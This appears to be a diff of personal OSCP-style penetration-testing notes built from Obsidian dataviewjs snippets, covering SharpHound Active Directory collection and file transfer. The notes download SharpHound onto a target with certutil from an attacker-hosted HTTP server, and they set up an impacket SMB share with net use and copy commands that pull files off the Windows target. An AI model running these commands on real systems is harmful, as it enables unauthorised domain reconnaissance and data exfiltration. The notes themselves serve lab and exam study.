@@ -58,7 +58,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 ## Host sharphound.exe
 
 ```
-cd ~/Desktop/Tools/Windows/Bloodhound && python -m http.server 80
+python -m http.server 80 --directory ~/Desktop/Tools/Windows/Bloodhound
 ```
 
 Transfer sharphound.ps1 onto target victim
@@ -70,10 +70,30 @@ const command = `certutil -urlcache -split -f http://${KaliIP}:80/SharpHound.exe
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 ```
-.\SharpHound.exe -c All -d {domain.htb} --zipfilename loot.zip
+.\SharpHound.exe -c All
 ```
 
 .\SharpHound.exe -c All --domain secura.yzx --domaincontroller dc01.secura.yzx
+
+```
+impacket-smbserver share $(pwd) -smb2support -username kali -password kali
+```
+
+Then on Windows:
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `net use \\\\${KaliIP}\\share /user:kali kali`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `copy C:\\Path\\To\\File.txt \\\\${KaliIP}\\share\\`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 
 [[File Transfer Guide]]
 
